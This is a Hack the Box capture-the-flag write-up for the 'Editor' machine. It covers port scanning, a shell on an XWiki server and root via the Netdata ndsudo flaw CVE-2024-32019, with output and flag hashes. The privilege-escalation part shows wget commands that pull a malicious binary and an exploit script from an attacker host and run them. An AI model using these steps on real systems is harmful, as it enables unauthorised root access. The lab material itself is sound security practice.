---
title: Hack the Box - Editor
time: 2025-11-21 12:00:00
categories: [htb, easy]
tags: [xlst injection]
published: false
hidden: true
---

## Recon
### Initial Scanning

<img width="959" height="115" alt="image" src="https://github.com/user-attachments/assets/0a21f6d9-7d67-45a1-8dbb-8d0431984404" />

`nmap` finds three open TCP ports, SSH (22), HTTP (80) HTTP proxy (8080):
```bash
╰─ nmap -p- -v --min-rate 1000 10.10.11.80
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-21 18:34 +08
Initiating Ping Scan at 18:34
Scanning 10.10.11.80 [2 ports]
Completed Ping Scan at 18:34, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:34
Host is up (0.10s latency).
Not shown: 64896 closed tcp ports (conn-refused), 636 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

─ nmap -p 22,80,8080 -sCV 10.10.11.80
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-21 20:06 +08
Nmap scan report for 10.10.11.80 (10.10.11.80)
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Jetty(10.0.20)
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 16.75 seconds
```

<img width="856" height="354" alt="image" src="https://github.com/user-attachments/assets/9557c7c2-eaff-4eb0-abd2-d7352a99a159" />

<img width="933" height="334" alt="image" src="https://github.com/user-attachments/assets/e8b79c0c-348c-4c3b-8687-e2d4ab750ffc" />

<img width="728" height="289" alt="image" src="https://github.com/user-attachments/assets/e0b422c9-b29e-42ee-bfdc-c4dc6ff36176" />

python3 -c 'import pty; pty.spawn("/bin/bash")'
xwiki@editor:/usr/lib/xwiki-jetty$ 

<img width="979" height="123" alt="image" src="https://github.com/user-attachments/assets/f2672574-e27c-4d8e-be50-d98cc3753fa5" />
```
╰─ ssh oliver@10.10.11.80 
The authenticity of host '10.10.11.80 (10.10.11.80)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:43: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.80' (ED25519) to the list of known hosts.
oliver@10.10.11.80's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Nov 21 04:10:52 PM UTC 2025

  System load:  0.0               Processes:             238
  Usage of /:   80.9% of 7.28GB   Users logged in:       0
  Memory usage: 57%               IPv4 address for eth0: 10.10.11.80
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Nov 21 16:10:53 2025 from 10.10.14.108
oliver@editor:~$ ls
nvme  user.txt
oliver@editor:~$ cat user.txt
84e2c522a69a063388644022344ee349
oliver@editor:~$ 

```

<img width="1010" height="369" alt="image" src="https://github.com/user-attachments/assets/61a684b4-7b4f-476c-bc03-00b357574c21" />

https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC
```
oliver@editor:~$ sudo -l
[sudo] password for oliver: 

Sorry, try again.
[sudo] password for oliver: 
Sorry, try again.
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
oliver@editor:~$ /opt/netdata/bin/netdata -V
netdata v1.45.2
oliver@editor:~$ wget http://10.10.14.108:8000/nvme
--2025-11-21 16:25:55--  http://10.10.14.108:8000/nvme
Connecting to 10.10.14.108:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 739944 (723K) [application/octet-stream]
Saving to: ‘nvme.1’

nvme.1                                   100%[===============================================================================>] 722.60K   860KB/s    in 0.8s    

2025-11-21 16:25:56 (860 KB/s) - ‘nvme.1’ saved [739944/739944]

oliver@editor:~$ chmod +x nvme
oliver@editor:~$ ls
LinEnum.sh  nvme  nvme.1  user.txt
oliver@editor:~$ ./nvme
oliver@editor:~$ wget http://10.10.14.108:8000/CVE-2024-32019.sh
--2025-11-21 16:27:12--  http://10.10.14.108:8000/CVE-2024-32019.sh
Connecting to 10.10.14.108:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 712 [text/x-sh]
Saving to: ‘CVE-2024-32019.sh’

CVE-2024-32019.sh                        100%[===============================================================================>]     712  --.-KB/s    in 0s      

2025-11-21 16:27:12 (98.2 MB/s) - ‘CVE-2024-32019.sh’ saved [712/712]


```


```
liver@editor:~$ sh CVE-2024-32019.sh
[+] ndsudo found at: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
[+] File 'nvme' found in the current directory.
[+] Execution permissions granted to ./nvme
[+] Running ndsudo with modified PATH:
root@editor:/home/oliver# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
root@editor:/home/oliver# cat /root/root.txt
41c87299d98ed9420c99d2cb10305758
root@editor:/home/oliver#    
```

